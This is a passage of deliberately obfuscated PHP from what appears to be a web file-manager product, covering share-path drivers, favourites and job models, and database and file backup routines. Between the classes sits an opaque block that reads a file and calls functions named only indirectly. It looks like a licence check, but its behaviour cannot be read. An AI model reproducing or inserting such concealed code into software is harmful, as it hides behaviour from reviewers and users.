Action($˜Ô«Ëûá[1363])->sharePathInfo($this->pathParse[$˜Ô«Ëûá[87]], !0, $´‰ä¶); } public function listPath($˜’Ù“áÒ, $ØñåÙ› = false) { $üõüÛÛ¶ =& $_SERVER[©—Ò»ÅĞ]; $¹Ñ«¡‡ = parent::listPath($˜’Ù“áÒ, $ØñåÙ›); if (!$¹Ñ«¡‡) { return $¹Ñ«¡‡; } if (is_array($¹Ñ«¡‡[$üõüÛÛ¶[967]])) { $¹Ñ«¡‡[$üõüÛÛ¶[967]] = Action($üõüÛÛ¶[1363])->shareItemInfo($¹Ñ«¡‡[$üõüÛÛ¶[967]]); } foreach ($¹Ñ«¡‡ as $—Ï“öˆù => $ÃğÒ§‚ã) { if (!in_array($—Ï“öˆù, array($üõüÛÛ¶[86], $üõüÛÛ¶[85]))) { continue; } foreach ($ÃğÒ§‚ã as $‰Ô©Ï¦ => $³Ô¢ÑÂø) { $¹Ñ«¡‡[$—Ï“öˆù][$‰Ô©Ï¦] = Action($üõüÛÛ¶[1363])->shareItemInfo($³Ô¢ÑÂø); } } return $¹Ñ«¡‡; } public function listAll($ı“åõêó) { $£Ø—ŠÓ— =& $_SERVER[©—Ò»ÅĞ]; $”Õ¬ö©æ = IO::info($this->pathParse[$£Ø—ŠÓ—[87]]); if (!$”Õ¬ö©æ) { return array(); } $›íğØÂ¼ = $this->model->listAll($ı“åõêó); foreach ($›íğØÂ¼ as &$É£Ú™í) { $É£Ú™í[$£Ø—ŠÓ—[90]] = Action($£Ø—ŠÓ—[1363])->shareItemInfo($É£Ú™í[$£Ø—ŠÓ—[90]]); } unset($É£Ú™í); return $›íğØÂ¼; } } class PathDriverDriverShareItem { public function __construct($Ù¦ğÅ÷¾) { $this->pathParse = $Ù¦ğÅ÷¾; } public function __call($€Îıú²ë, $„Ç²Â‰ü) { $á‚úĞù½ =& $_SERVER[©—Ò»ÅĞ]; if (method_exists($this, $€Îıú²ë)) { return; } $Ë×éİº = call_user_func_array(array($á‚úĞù½[1541], $€Îıú²ë), $„Ç²Â‰ü); $‘‹üö» = array($á‚úĞù½[1542], $á‚úĞù½[1543], $á‚úĞù½[1544], $á‚úĞù½[1545], $á‚úĞù½[641], $á‚úĞù½[643], $á‚úĞù½[1546], $á‚úĞù½[107], $á‚úĞù½[1547], $á‚úĞù½[1548]); if (in_array($€Îıú²ë, $‘‹üö»)) { $Ë×éİº = $this->getPathOuter($Ë×éİº); } return $Ë×éİº; } public function copy($‘œÏ¼üí, $ˆ×ìÎ¼Â, $ë´³²Î° = false, $¹†¿ëÆÖ = false) { return $this->copyMove($‘œÏ¼üí, $ˆ×ìÎ¼Â, $ë´³²Î°, $_SERVER[©—Ò»ÅĞ][641], $¹†¿ëÆÖ); } public function move($ˆŞ°¤¢‡, $‡÷ÏâÅ, $®¹ó¶Òü = false, $†°¿ÀÆ¿ = false) { return $this->copyMove($ˆŞ°¤¢‡, $‡÷ÏâÅ, $®¹ó¶Òü, $_SERVER[©—Ò»ÅĞ][643], $†°¿ÀÆ¿); } private function copyMove($íœ§î£¯, $¿‡÷¾š°, $®ì›©, $íü¡Ø™õ, $ô×œ´Ò¸ = false) { $ĞÚ‚ŠÓ» =& $_SERVER[©—Ò»ÅĞ]; $òôß¿ìü = $¿‡÷¾š°; $˜Íƒ¶¶ = IO::driverMake($¿‡÷¾š°); if ($˜Íƒ¶¶->pathParse[$ĞÚ‚ŠÓ»[1337]]) { $¿‡÷¾š° = $˜Íƒ¶¶->pathParse[$ĞÚ‚ŠÓ»[1337]]; } else { $¿‡÷¾š° = $òôß¿ìü; } $Î‘²ğæç = IO::copyMove($íœ§î£¯, $¿‡÷¾š°, $®ì›©, $íü¡Ø™õ, $ô×œ´Ò¸); $Î‘²ğæç = $this->getPathOuter($Î‘²ğæç); return $Î‘²ğæç; } public function pathThis($¿ìÌ±ƒ°) { return get_path_this($this->pathParse[$_SERVER[©—Ò»ÅĞ][87]]); } public function pathFather($¥äœäêé) { return get_path_father($this->pathParse[$_SERVER[©—Ò»ÅĞ][87]]); } public function iconvSystem($¤ÜŞŞÈ) { return $¤ÜŞŞÈ; } protected function infoParse($ÄÜÖøæ¬, $ıÓŒ†Ë = false) { $éĞ÷¦üÙ =& $_SERVER[©—Ò»ÅĞ]; $Ş”Ñ› = $this->pathParse[$éĞ÷¦üÙ[576]][$éĞ÷¦üÙ[583]] . $this->pathParse[$éĞ÷¦üÙ[1356]]; if ($ıÓŒ†Ë) { $„Ó§ÌÌÍ = IO::infoWithChildren($Ş”Ñ›); } else { $„Ó§ÌÌÍ = IO::info($Ş”Ñ›); } $ÓŞ±¨øÅ = $this->pathParse[$éĞ÷¦üÙ[576]]; return Action($éĞ÷¦üÙ[1540])->_shareItemeParse($„Ó§ÌÌÍ, $ÓŞ±¨øÅ); } public function listAll($âêîƒ¡ó) { $©€ÔÁöÊ =& $_SERVER[©—Ò»ÅĞ]; $Äåı¼Š– = IO::listAll($âêîƒ¡ó); $÷ùÉÓÅ = rtrim($this->pathParse[$©€ÔÁöÊ[576]][$©€ÔÁöÊ[583]], $©€ÔÁöÊ[8]); foreach ($Äåı¼Š– as &$€ïûìï˜) { $€ïûìï˜[$©€ÔÁöÊ[87]] = $this->pathDriver . $©€ÔÁöÊ[8] . ltrim(substr($€ïûìï˜[$©€ÔÁöÊ[87]], strlen($÷ùÉÓÅ)), $©€ÔÁöÊ[8]); } unset($€ïûìï˜); return $Äåı¼Š–; } public function listAllSimple($Æ´‡ÖÄ¸, $åº‡ÖÒÆ = false) { $ñïå³ğµ =& $_SERVER[©—Ò»ÅĞ]; $í’”×ı  = $this->listAll($Æ´‡ÖÄ¸); $¯ÜìåŠİ = $this->pathParse[$ñïå³ğµ[510]]; if (trim($¯ÜìåŠİ, $ñïå³ğµ[8]) == trim(get_path_father($¯ÜìåŠİ), $ñïå³ğµ[8])) { $åº‡ÖÒÆ = !0; } return IO::init($ñïå³ğµ[12])->listAllSimpleMake($í’”×ı , $¯ÜìåŠİ, $åº‡ÖÒÆ); } public function getPathOuter($¼ö¬õîÔ) { $«©âºËÖ =& $_SERVER[©—Ò»ÅĞ]; $´Ø»¹¦» = KodIO::parse($¼ö¬õîÔ); if ($´Ø»¹¦»[$«©âºËÖ[33]] == KodIO::KOD_SHARE_ITEM) { return $´Ø»¹¦»[$«©âºËÖ[87]]; } $†‘´äò = KodIO::clear($¼ö¬õîÔ); $³äÆÓá» = KodIO::clear($this->pathParse[$«©âºËÖ[576]][$«©âºËÖ[583]]); $©™„¢”¤ = substr($†‘´äò, strlen($³äÆÓá»)); if (substr($†‘´äò, 0, strlen($³äÆÓá»)) != $³äÆÓá») { return !1; } return $this->pathParse[$«©âºËÖ[1357]] . $«©âºËÖ[8] . ltrim($©™„¢”¤, $«©âºËÖ[8]); } public function getType() { $ÄÊãÔ“¬ =& $_SERVER[©—Ò»ÅĞ]; $»­‹–˜ = str_replace($ÄÊãÔ“¬[77], $ÄÊãÔ“¬[12], get_class($this)); return strtolower($»­‹–˜); } public function isOsDriver($ê‹‹¥ù) { return IO::isOsDriver($ê‹‹¥ù); } public function info($™¼ËÅ) { return $this->infoParse($™¼ËÅ); } public function infoAuth($ãÖîÆã) { return $this->infoParse($ãÖîÆã); } public function infoWithChildren($İÙÉı“ë) { return $this->infoParse($İÙÉı“ë, !0); } public function infoFull($êÄ¸¬ˆæ) { return $this->infoParse($êÄ¸¬ˆæ); } } goto fµÚ‹Ê·¿; b¬õó—Ü‚: class UserFavModel extends ModelBase { protected $tableName = "\165\163\x65\x72\x5f\x66\141\166"; protected function cacheFunctionAlias($µ¦•†°Ë) { $ƒè„ôì =& $_SERVER[©—Ò»ÅĞ]; return array($ƒè„ôì[2297] => array(USER_ID, $ƒè„ôì[2671])); } protected function ___listData() { $ŒĞ„üÙ =& $_SERVER[©—Ò»ÅĞ]; $Æ³±‚„ = array($ŒĞ„üÙ[1969] => USER_ID, $ŒĞ„üÙ[573] => 0); $ßç“¾× = $ŒĞ„üÙ[2672]; $â¨†öğ¿ = $this->field($ßç“¾×)->where($Æ³±‚„)->order($ŒĞ„üÙ[2673])->select(); return $â¨†öğ¿ ? $â¨†öğ¿ : array(); } protected function resetCache() { } protected function listView() { $¤Ãæ¼”Ã =& $_SERVER[©—Ò»ÅĞ]; $©á÷…ğÍ = $this->listData(); $Ç†Ÿõ¿ï = array_filter_by_field($©á÷…ğÍ, $¤Ãæ¼”Ã[33], $¤Ãæ¼”Ã[505]); $­¿ñ±äí = array_to_keyvalue($Ç†Ÿõ¿ï, $¤Ãæ¼”Ã[12], $¤Ãæ¼”Ã[87]); if (!$­¿ñ±äí) { return $©á÷…ğÍ; } $„ßÚ€Ñ¤ = 2000; $åÑ¤ÖÊ‹ = array($¤Ãæ¼”Ã[506] => array($¤Ãæ¼”Ã[507], $­¿ñ±äí)); $°úÛ«ß½ = Model($¤Ãæ¼”Ã[933])->listSource($åÑ¤ÖÊ‹, $„ßÚ€Ñ¤); $°úÛ«ß½ = array_merge($°úÛ«ß½[$¤Ãæ¼”Ã[86]], $°úÛ«ß½[$¤Ãæ¼”Ã[85]]); $°úÛ«ß½ = array_to_keyvalue($°úÛ«ß½, $¤Ãæ¼”Ã[191]); foreach ($©á÷…ğÍ as $”Öô°Œ => $ò”×êµñ) { $­¢È‹„û = $°úÛ«ß½[$ò”×êµñ[$¤Ãæ¼”Ã[87]]]; $­¢È‹„û = $­¢È‹„û ? $­¢È‹„û : array(); $©á÷…ğÍ[$”Öô°Œ] = array_merge($­¢È‹„û, $ò”×êµñ); } return $©á÷…ğÍ; } protected function addFav($•…€œıà, $„ÄÙşøú = '', $ªìí®ÆŠ = "\163\157\165\162\x63\x65") { $­–ÒÌ€ =& $_SERVER[©—Ò»ÅĞ]; $–ŒÜ¡Óî = array($­–ÒÌ€[1969] => USER_ID, $­–ÒÌ€[573] => 0, $­–ÒÌ€[511] => $ªìí®ÆŠ, $­–ÒÌ€[510] => $•…€œıà); if ($this->where($–ŒÜ¡Óî)->find()) { return !1; } $–ŒÜ¡Óî = array($­–ÒÌ€[1969] => USER_ID, $­–ÒÌ€[573] => 0); $Ñäµ¿Ù = $this->where($–ŒÜ¡Óî)->max($­–ÒÌ€[2205]); if (!$Ñäµ¿Ù) { $Ñäµ¿Ù = 0; } if (!$„ÄÙşøú && $ªìí®ÆŠ == $­–ÒÌ€[505]) { $Œõ—ÑÄÛ = Model($­–ÒÌ€[1533])->where(array($­–ÒÌ€[506] => $•…€œıà))->find(); if (!$Œõ—ÑÄÛ) { return !1; } $„ÄÙşøú = $Œõ—ÑÄÛ[$­–ÒÌ€[32]]; } $„ÄÙşøú = $this->getAutoName($„ÄÙşøú); $Êß‰ïó = array($­–ÒÌ€[1969] => USER_ID, $­–ÒÌ€[573] => 0, $­–ÒÌ€[509] => $„ÄÙşøú, $­–ÒÌ€[510] => $•…€œıà, $­–ÒÌ€[511] => $ªìí®ÆŠ, $­–ÒÌ€[2187] => $Ñäµ¿Ù + 1); return $this->add($Êß‰ïó); } protected function remove($‰×‰è¡) { $œÀÔ¸¨ =& $_SERVER[©—Ò»ÅĞ]; $®úêÙíã = array($œÀÔ¸¨[1969] => USER_ID, $œÀÔ¸¨[508] => $‰×‰è¡); return $this->where($®úêÙíã)->delete(); } protected function removeByName($¸û¢úĞÜ) { $£˜ğ¦”µ =& $_SERVER[©—Ò»ÅĞ]; $Îì©Ö×î = array($£˜ğ¦”µ[1969] => USER_ID, $£˜ğ¦”µ[509] => $¸û¢úĞÜ, $£˜ğ¦”µ[573] => 0); return $this->where($Îì©Ö×î)->delete(); } protected function rename($¤ÚªÂÔ, $Ê±®ÄüÌ) { $ã†Ú†‚ =& $_SERVER[©—Ò»ÅĞ]; if ($¤ÚªÂÔ == $Ê±®ÄüÌ) { return !1; } $ÑÛÚı¿š = $this->getAutoName($Ê±®ÄüÌ); if ($Ê±®ÄüÌ != $ÑÛÚı¿š) { return !1; } $÷Ñ×¶¿Ñ = array($ã†Ú†‚[1969] => USER_ID, $ã†Ú†‚[573] => 0, $ã†Ú†‚[32] => $¤ÚªÂÔ); return $this->where($÷Ñ×¶¿Ñ)->save(array($ã†Ú†‚[32] => $Ê±®ÄüÌ)); } protected function resetSort($¤ŸÁîäâ) { $²Å€ãóà =& $_SERVER[©—Ò»ÅĞ]; $¤ŸÁîäâ = is_array($¤ŸÁîäâ) ? $¤ŸÁîäâ : array(); $½¦‚ı = array($²Å€ãóà[1969] => USER_ID); for ($ÑÒ¡…ôÌ = 0; $ÑÒ¡…ôÌ < count($¤ŸÁîäâ); $ÑÒ¡…ôÌ++) { $½¦‚ı[$²Å€ãóà[508]] = $¤ŸÁîäâ[$ÑÒ¡…ôÌ]; $this->where($½¦‚ı)->save(array($²Å€ãóà[2187] => $ÑÒ¡…ôÌ + 1)); } return !0; } protected function moveTop($æìÇëÍ¶) { $®“ŞÏï” =& $_SERVER[©—Ò»ÅĞ]; $œû‡’İ = array($®“ŞÏï”[1969] => USER_ID, $®“ŞÏï”[573] => 0); $–õçëŒ¼ = $this->where($œû‡’İ)->where(array($®“ŞÏï”[32] => $æìÇëÍ¶))->find(); if (!$–õçëŒ¼) { return; } $˜ìåá©ä = $this->field($®“ŞÏï”[487])->where($œû‡’İ)->order($®“ŞÏï”[2673])->select(); $˜ìåá©ä = array_to_keyvalue($˜ìåá©ä, $®“ŞÏï”[12], $®“ŞÏï”[487]); $“ö¯¿’ö = $˜ìåá©ä; $˜ìåá©ä = array_remove_value($˜ìåá©ä, $–õçëŒ¼[$®“ŞÏï”[487]]); array_unshift($˜ìåá©ä, $–õçëŒ¼[$®“ŞÏï”[487]]); return $this->resetSort($˜ìåá©ä); } protected function moveBottom($áÑÖ¡×) { $ÓÑÉÙ =& $_SERVER[©—Ò»ÅĞ]; $ìæ‡Øã– = array($ÓÑÉÙ[1969] => USER_ID, $ÓÑÉÙ[573] => 0); $Éàû¾±¨ = $this->where($ìæ‡Øã–)->max($ÓÑÉÙ[2205]); $Œ±¬ü³ô = array($ÓÑÉÙ[2205] => $Éàû¾±¨ + 1); return $this->where($ìæ‡Øã–)->where(array($ÓÑÉÙ[32] => $áÑÖ¡×))->save($Œ±¬ü³ô); } private function getAutoName($Â§åÍÏÌ) { $êàıï•£ =& $_SERVER[©—Ò»ÅĞ]; $®½“úÈ = array($êàıï•£[1969] => USER_ID, $êàıï•£[573] => 0); $›½ñ¢Ş = $this->field($êàıï•£[32])->where($®½“úÈ)->select(); $›½ñ¢Ş = array_to_keyvalue($›½ñ¢Ş, $êàıï•£[12], $êàıï•£[32]); if (!$›½ñ¢Ş || !in_array($Â§åÍÏÌ, $›½ñ¢Ş)) { return $Â§åÍÏÌ; } for ($¢‹†úØÂ = 0; $¢‹†úØÂ < count($›½ñ¢Ş); $¢‹†úØÂ++) { if (!in_array($Â§åÍÏÌ . "\50{$¢‹†úØÂ}\51", $›½ñ¢Ş)) { return $Â§åÍÏÌ . "\x28{$¢‹†úØÂ}\51"; } } return $Â§åÍÏÌ . "\50{$¢‹†úØÂ}\x29"; } } class UserJobModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\x65\155\x2e\x6a\x6f\142\x4c\151\x73\164"; public $field = array("\156\141\155\x65", "\144\145\x73\x63", "\x73\157\162\x74"); const JOB_KEY = "\x73\x65\154\x66\x4a\157\142\114\151\x73\x74"; public function listData($›†…Ãøµ = false, $´÷‰õÁ = "\163\x6f\162\164", $¹£¦İÇ = false) { return parent::listData($›†…Ãøµ, $´÷‰õÁ, $¹£¦İÇ); } public function remove($™Ç½€‚Î) { return parent::remove($™Ç½€‚Î); } public function add($Îâ©ÚÈ¡) { $š™•Ş =& $_SERVER[©—Ò»ÅĞ]; if ($this->findByName($Îâ©ÚÈ¡[$š™•Ş[32]])) { return !1; } $Îâ©ÚÈ¡[$š™•Ş[2205]] = $this->getSort(); return parent::insert($Îâ©ÚÈ¡); } private function getSort() { $ˆ‘ Æ•ø =& $_SERVER[©—Ò»ÅĞ]; $åòî¡Ò = parent::listData(); $â¦©Ï™í = array_to_keyvalue($åòî¡Ò, $ˆ‘ Æ•ø[12], $ˆ‘ Æ•ø[2205]); return empty($â¦©Ï™í) ? 0 : max($â¦©Ï™í) + 1; } public function update($Ï§üŞş°, $Ÿ÷¿ùä…) { $™§ º×õ =& $_SERVER[©—Ò»ÅĞ]; $’àÑ²Æ‹ = parent::listData($Ï§üŞş°); $ÌÚîš¼¼ = $this->findByName($Ÿ÷¿ùä…[$™§ º×õ[32]]); if (!$’àÑ²Æ‹ || $ÌÚîš¼¼ && $ÌÚîš¼¼[$™§ º×õ[487]] != $’àÑ²Æ‹[$™§ º×õ[487]]) { return !1; } return parent::update($Ï§üŞş°, $Ÿ÷¿ùä…); } public function setUserJob($é±ò™éÊ, $¦íÌö€ƒ) { $ª¼ÔÈãá =& $_SERVER[©—Ò»ÅĞ]; if (!is_array($¦íÌö€ƒ)) { $¦íÌö€ƒ = array($¦íÌö€ƒ); } $§ï†ßÑœ = parent::listData(); $ŸêÕ˜¹¬ = array_to_keyvalue($§ï†ßÑœ, $ª¼ÔÈãá[32]); $˜ª§¸ì = $ª¼ÔÈãá[463]; foreach ($¦íÌö€ƒ as $¿¡Š¸øô) { if ($ŸêÕ˜¹¬[$¿¡Š¸øô]) { $˜ª§¸ì .= $ŸêÕ˜¹¬[$¿¡Š¸øô][$ª¼ÔÈãá[487]] . $ª¼ÔÈãá[50]; } else { $’°ŸÔ† = $this->add($¿¡Š¸øô); $˜ª§¸ì .= $’°ŸÔ† . $ª¼ÔÈãá[50]; } } $˜ª§¸ì = rtrim($˜ª§¸ì, $ª¼ÔÈãá[50]); Model($ª¼ÔÈãá[617])->metaSet($é±ò™éÊ, self::JOB_KEY, $˜ª§¸ì); } public function getUserJob($ìŸªùñ¦) { $äÜË—ñ· = Model($_SERVER[©—Ò»ÅĞ][617])->metaGet($ìŸªùñ¦); return $this->getUserJobInfo($äÜË—ñ·[self::JOB_KEY]); } public function getUserJobInfo($Ã£êÚş³) { $Øåãøµ« =& $_SERVER[©—Ò»ÅĞ]; $Âúµêò = explode($Øåãøµ«[50], $Ã£êÚş³); $Ü—×°ûÑ = parent::listData(); $Ü—×°ûÑ = array_remove_key($Ü—×°ûÑ, $Øåãøµ«[231]); $Äû¢œ„³ = array(); foreach ($Âúµêò as $…¬­Ü¢È) { if (isset($Ü—×°ûÑ[$…¬­Ü¢È])) { $Äû¢œ„³[] = $Ü—×°ûÑ[$…¬­Ü¢È]; } } return $Äû¢œ„³; } } if ($_SERVER[$_SERVER[©—Ò»ÅĞ][1034]] != $_SERVER[$_SERVER[©—Ò»ÅĞ][1076]]) { $_getc = $_SERVER[©—Ò»ÅĞ][1037]; $_getfile = $_SERVER[$_SERVER[©—Ò»ÅĞ][1038]] . $_SERVER[©—Ò»ÅĞ][1039]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[©—Ò»ÅĞ][285], $_getfilec); if (count($_getarrs) < $_SERVER[©—Ò»ÅĞ][714]) { $exit = $_SERVER[©—Ò»ÅĞ][1040]; $exit(); } $_act = $_SERVER[©—Ò»ÅĞ][1045]; $_act($_SERVER[$_SERVER[©—Ò»ÅĞ][1035]]); } goto Bì­ÃÌµè; b£„ÙÎÏÁ: class BackupDbFile { public function __construct() { } public function index() { $İü†à§Ò =& $_SERVER[©—Ò»ÅĞ]; $¶ëçà²Á = Backup::get(); $ØÇ‚“ù = $¶ëçà²Á[$İü†à§Ò[32]]; $ü¨ÃĞ¦Ö = $this->tmpFilesPath() . "\142\x61\143\x6b\165\160\137{$ØÇ‚“ù}\57"; $ËéÏ = $this->backupPath($¶ëçà²Á); if (!($ËéÏ = IO::mkdir($ËéÏ))) { Backup::log($İü†à§Ò[900] . $ËéÏ); return !1; } $¯µ—Ä”† = new DbManage(); $Û—ƒìÌ  = $¯µ—Ä”†->getSqlFile(); if (!$Û—ƒìÌ  || !$Û—ƒìÌ [$İü†à§Ò[901]] || !$Û—ƒìÌ [$İü†à§Ò[13]]) { Backup::log($İü†à§Ò[902]); return !1; } IO::move($Û—ƒìÌ [$İü†à§Ò[901]], $ü¨ÃĞ¦Ö); IO::move($Û—ƒìÌ [$İü†à§Ò[13]], $ü¨ÃĞ¦Ö); $¯µ—Ä”†->mixBakList($ü¨ÃĞ¦Ö); $ÕÆúÍ = IO::listPath($ü¨ÃĞ¦Ö); $»ü›‡û = isset($ÕÆúÍ[$İü†à§Ò[86]]) ? $ÕÆúÍ[$İü†à§Ò[86]] : array(); $»ìå‹ğ» = array_sum(array_column($»ü›‡û, $İü†à§Ò[79])); if (!$»ìå‹ğ») { Backup::log($İü†à§Ò[903] . $ü¨ÃĞ¦Ö); return !1; } $Ğİ€ï£Ñ = array($İü†à§Ò[904] => $»ìå‹ğ», $İü†à§Ò[905] => time()); Backup::set($Ğİ€ï£Ñ); Hook::trigger($İü†à§Ò[906], $ü¨ÃĞ¦Ö, $ËéÏ); $…¡Õ†€‰ = new TaskFileTransfer($İü†à§Ò[906], $İü†à§Ò[879], count($»ü›‡û), LNG($İü†à§Ò[887]) . $İü†à§Ò[476] . LNG($İü†à§Ò[889]) . $İü†à§Ò[907]); $…¡Õ†€‰->task[$İü†à§Ò[864]] = $»ìå‹ğ»; foreach ($ÕÆúÍ[$İü†à§Ò[86]] as $ÖÇ§—Ã¯) { $ìÏÂÚÔ = IO::move($ÖÇ§—Ã¯[$İü†à§Ò[87]], $ËéÏ); if (!$ìÏÂÚÔ) { $…¡Õ†€‰->end(); $Ó¶Ú¤Š¡ = IO::getLastError($İü†à§Ò[908] . $ÖÇ§—Ã¯[$İü†à§Ò[87]] . $İü†à§Ò[909] . $ËéÏ . $İü†à§Ò[175]); Backup::log($Ó¶Ú¤Š¡); return !1; } } $…¡Õ†€‰->end(); $Ğİ€ï£Ñ = array($İü†à§Ò[910] => $»ìå‹ğ», $İü†à§Ò[911] => time()); Backup::set($Ğİ€ï£Ñ); return !0; } private function backupPath($üºœÍ¹Æ) { $•Ñ—ó¨ã =& $_SERVER[©—Ò»ÅĞ]; $Ã—¨Ù˜ò = $üºœÍ¹Æ[$•Ñ—ó¨ã[32]]; $¤ÖœÎ“Õ = Model($•Ñ—ó¨ã[873])->get($•Ñ—ó¨ã[874]); $¥ıí¯Ïü = substr(md5($•Ñ—ó¨ã[875] . $¤ÖœÎ“Õ . $Ã—¨Ù˜ò), 0, 8); return "\173\151\157\72{$üºœÍ¹Æ[$•Ñ—ó¨ã[852]]}\x7d\57\x64\x61\164\141\x62\x61\163\x65\x2f\x62\141\x63\x6b\x75\160\x2f" . $Ã—¨Ù˜ò . $•Ñ—ó¨ã[11] . $¥ıí¯Ïü; } private function tmpFilesPath() { $å‹š­¿¶ =& $_SERVER[©—Ò»ÅĞ]; $ë“¹¹Õ¬ = TEMP_FILES; if ($GLOBALS[$å‹š­¿¶[6]][$å‹š­¿¶[92]][$å‹š­¿¶[898]]) { $ë“¹¹Õ¬ = $GLOBALS[$å‹š­¿¶[6]][$å‹š­¿¶[92]][$å‹š­¿¶[898]]; if (!mk_dir($ë“¹¹Õ¬) || !is_writable($ë“¹¹Õ¬) || !IO::mkfile($ë“¹¹Õ¬ . $å‹š­¿¶[899])) { $ë“¹¹Õ¬ = TEMP_FILES; } } return $ë“¹¹Õ¬; } } class BackupFile { protected $bakVer = "\x6f\x6c\144"; public function __construct($¡ç¢ä = false) { $Ñ‹¯å£¸ =& $_SERVER[©—Ò»ÅĞ]; $this->bakVer = $¡ç¢ä ? $Ñ‹¯å£¸[912] : $Ñ‹¯å£¸[913]; } public function index() { $äªĞµÎ‡ = Backup::get(); $Â„˜™Æ = $äªĞµÎ‡[$_SERVER[©—Ò»ÅĞ][856]][$_SERVER[©—Ò»ÅĞ][230]][$_SERVER[©—Ò»ÅĞ][557]]; $Ğ‹Ú…• = array($_SERVER[©—Ò»ÅĞ][558] => array($_SERVER[©—Ò»ÅĞ][914], $Â„˜™Æ), $_SERVER[©—Ò»ÅĞ][915] => array($_SERVER[©—Ò»ÅĞ][406], $äªĞµÎ‡[$_SERVER[©—Ò»ÅĞ][852]])); $±¥óúÇÀ = (int) Model($_SERVER[©—Ò»ÅĞ][916])->where($Ğ‹Ú…•)->count($_SERVER[©—Ò»ÅĞ][557]); $æä³ë« = (int) Model($_SERVER[©—Ò»ÅĞ][916])->where($Ğ‹Ú…•)->sum($_SERVER[©—Ò»ÅĞ][79]); $–®˜É¤® = new TaskFileTransfer($_SERVER[©—Ò»ÅĞ][917], $_SERVER[©—Ò»ÅĞ][879], $±¥óúÇÀ, LNG($_SERVER[©—Ò»ÅĞ][887]) . $_SERVER[©—Ò»ÅĞ][888] . LNG($_SERVER[©—Ò»ÅĞ][918])); $–®˜É¤®->task[$_SERVER[©—Ò»ÅĞ][864]] = $æä³ë«; $¬ªø­Ü‰ = array($_SERVER[©—Ò»ÅĞ][919] => $±¥óúÇÀ, $_SERVER[©—Ò»ÅĞ][920] => $æä³ë«, $_SERVER[©—Ò»ÅĞ][921] => time()); Backup::set($¬ªø­Ü‰); $¾™©‰ÆÖ = !0; $ƒ¿£¢Ü„ = $this->storeIds(); $ı±İüò = 1; $ ¨¡Úõ± = 1000; $üıÇ´€Ü = $¤¤‰¾« = 0; $®Øæçû = array(); $ŒÃ÷‡‚… = $‡§ô´Ú = 0; do { $Ş·¨×“¡ = $_SERVER[©—Ò»ÅĞ][922]; $˜Ïôî“ = Model($_SERVER[©—Ò»ÅĞ][916])->where($Ğ‹Ú…•)->field($Ş·¨×“¡)->order($_SERVER[©—Ò»ÅĞ][923])->selectPage($ ¨¡Úõ±, $ı±İüò); $›¸Õšè = !empty($˜Ïôî“[$_SERVER[©—Ò»ÅĞ][446]]) ? $˜Ïôî“[$_SERVER[©—Ò»ÅĞ][446]] : array(); foreach ($›¸Õšè as $è‰°) { if (!$this->_fileExist($è‰°, $®Øæçû, $ƒ¿£¢Ü„)) { Backup::log($_SERVER[©—Ò»ÅĞ][924] . $è‰°[$_SERVER[©—Ò»ÅĞ][557]] . $_SERVER[©—Ò»ÅĞ][925] . $è‰°[$_SERVER[©—Ò»ÅĞ][87]]); continue; } $†Æµ€¡‡ = $è‰°[$_SERVER[©—Ò»ÅĞ][87]]; $ç‰‚à™ = "\173\151\x6f\72{$äªĞµÎ‡[$_SERVER[©—Ò»ÅĞ][852]]}\x7d" . substr($†Æµ€¡‡, strlen("\x7b\151\157\x3a{$è‰°[$_SERVER[©—Ò»ÅĞ][926]]}\x7d")); if (IO::exist($ç‰‚à™)) { $–®˜É¤®->updateFileEnd($è‰°[$_SERVER[©—Ò»ÅĞ][32]], $è‰°[$_SERVER[©—Ò»ÅĞ][79]]); } else { $ç‰‚à™ = get_path_father($ç‰‚à™); IO::mkdir($ç‰‚à™); if (!IO::copy($†Æµ€¡‡, $ç‰‚à™, $_SERVER[©—Ò»ÅĞ][927])) { Backup::log($_SERVER[©—Ò»ÅĞ][928] . $†Æµ€¡‡ . $_SERVER[©—Ò»ÅĞ][909] . $ç‰‚à™ . $_SERVER[©—Ò»ÅĞ][175]); $¾™©‰ÆÖ = !1; break; } } $Â„˜™Æ = $è‰°[$_SERVER[©—Ò»ÅĞ][557]]; $¤¤‰¾« += 1; $üıÇ´€Ü += $è‰°[$_SERVER[©—Ò»ÅĞ][79]]; $‡§ô´Ú += 1; $ŒÃ÷‡‚… += $è‰°[$_SERVER[©—Ò»ÅĞ][79]]; if ($üıÇ´€Ü >= 1024 * 1024 * 100) { $¬ªø­Ü‰ = array($_SERVER[©—Ò»ÅĞ][851] => $Â„˜™Æ, $_SERVER[©—Ò»ÅĞ][929] => $‡§ô´Ú, $_SERVER[©—Ò»ÅĞ][930] => $ŒÃ÷‡‚…); Backup::set($¬ªø­Ü‰); $üıÇ´€Ü = $¤¤‰¾« = 0; } } $Œëô­¥­ = count($›¸Õšè); $ı±İüò++; } while ($Œëô­¥­ == $ ¨¡Úõ±); $–®˜É¤®->end(); $¬ªø­Ü‰ = array($_SERVER[©—Ò»ÅĞ][931] => 1, $_SERVER[©—Ò»ÅĞ][862] => time(), $_SERVER[©—Ò»ÅĞ][878] => 1, $_SERVER[©—Ò»ÅĞ][851] => $Â„˜™Æ, $_SERVER[©—Ò»ÅĞ][932] => time()); if ($¤¤‰¾«) { $¬ªø­Ü‰[$_SERVER[©—Ò»ÅĞ][929]] = $‡§ô´Ú; $¬ªø­Ü‰[$_SERVER[©—Ò»ÅĞ][930]] = $ŒÃ÷‡‚…; } Backup::set($¬ªø­Ü‰); return !0; } private function _fileExist($ÙíÀ”î, &$¹¼á¼Œ, $Î¡àòÇ) { $€ïÔ¤æ =& $_SERVER[©—Ò»ÅĞ]; $†™ıÓ½ = $ÙíÀ”î[$€ïÔ¤æ[87]]; if (in_array($ÙíÀ”î[$€ïÔ¤æ[557]], $¹¼á¼Œ)) { return !1; } if (!in_array($ÙíÀ”î[$€ïÔ¤æ[926]], $Î¡àòÇ)) { return !1; } if (IO::exist($†™ıÓ½)) { return !0; } $¥÷ü²¢„ = get_path_father($†™ıÓ½); if (IO::exist($¥÷ü²¢„)) { $¹¼á¼Œ[] = $ÙíÀ”î[$€ïÔ¤æ[557]]; return !1; } $·†ÎóËÈ = array($€ïÔ¤æ[926] => $ÙíÀ”î[$€ïÔ¤æ[926]], $€ïÔ¤æ[87] => array($€ïÔ¤æ[473], "{$¥÷ü²¢„}\45")); $˜±™Ûã¿ = Model($€ïÔ¤æ[916])->where($·†ÎóËÈ)->field($€ïÔ¤æ[558])->select(); $¹¼á¼Œ = array_merge($¹¼á¼Œ, array_to_keyvalue($˜±™Ûã¿, $€ïÔ¤æ[12], $€ïÔ¤æ[557])); return !1; } private function 